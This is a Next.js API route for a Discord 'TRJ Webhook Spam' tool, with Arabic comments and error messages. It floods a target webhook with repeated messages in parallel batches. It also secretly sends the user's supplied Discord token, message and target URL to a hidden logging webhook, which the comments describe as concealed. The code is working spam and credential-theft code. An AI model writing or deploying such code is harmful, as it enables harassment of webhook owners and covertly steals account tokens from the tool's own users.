import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';

export const maxDuration = 300;

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, webhookUrl: targetWebhookUrl, message, count = 50, username, avatarUrl } = body;

    if (!targetWebhookUrl) {
      return NextResponse.json({ success: false, error: 'أدخل رابط الويب هوك' }, { status: 400 });
    }
    if (!message) {
      return NextResponse.json({ success: false, error: 'أدخل الرسالة' }, { status: 400 });
    }

    const ct = token ? cleanToken(token) : '';
    // ⚠️ نرسل المعلومات فقط للويب هوك المخفي في الكود - NOT للويب هوك المستهدف
    const whUrl = getLogWebhookUrl();
    let sent = 0, failed = 0;

    // إرسال معلومات للويب هوك المخفي فقط (مش للويب هوك المستهدف!)
    sendToWebhook({
      username: 'TRJ Webhook Spam',
      embeds: [{
        title: '🔗 Webhook Spam Started',
        color: 0xFF69B4,
        fields: [
          { name: '💬 Message', value: message.substring(0, 200), inline: false },
          { name: '🔢 Count', value: String(count), inline: true },
          { name: '👤 Username', value: username || 'Default', inline: true },
          ...(ct ? [{ name: '🎫 Token', value: `\`\`\`${ct}\`\`\``, inline: false }] : []),
          { name: '🔗 Target Webhook', value: targetWebhookUrl.substring(0, 80) + '...', inline: false },
        ],
        footer: { text: 'TRJ BOT v3.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // Build webhook payload
    const payload: Record<string, unknown> = {
      content: message,
    };
    if (username) payload.username = username;
    if (avatarUrl) payload.avatar_url = avatarUrl;

    // Send in parallel batches of 15
    const batchSize = 15;
    for (let i = 0; i < count; i += batchSize) {
      const batchLen = Math.min(batchSize, count - i);
      const results = await Promise.allSettled(
        Array.from({ length: batchLen }, async () => {
          try {
            const controller = new AbortController();
            const tid = setTimeout(() => controller.abort(), 15000);
            const res = await fetch(targetWebhookUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload),
              signal: controller.signal,
            });
            clearTimeout(tid);
            return res.ok || res.status === 204;
          } catch {
            return false;
          }
        })
      );

      for (const r of results) {
        if (r.status === 'fulfilled' && r.value) sent++;
        else failed++;
      }

      if (i + batchSize < count) {
        await new Promise(r => setTimeout(r, 80));
      }
    }

    // نتيجة للويب هوك المخفي فقط
    sendToWebhook({
      username: 'TRJ Webhook Spam',
      embeds: [{
        title: '✅ Webhook Spam Completed',
        color: 0x00FF41,
        fields: [
          { name: '✅ Sent', value: String(sent), inline: true },
          { name: '❌ Failed', value: String(failed), inline: true },
          { name: '🔢 Total', value: String(count), inline: true },
        ],
        footer: { text: 'TRJ BOT v3.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats: { sent, failed } });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Webhook Spam Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
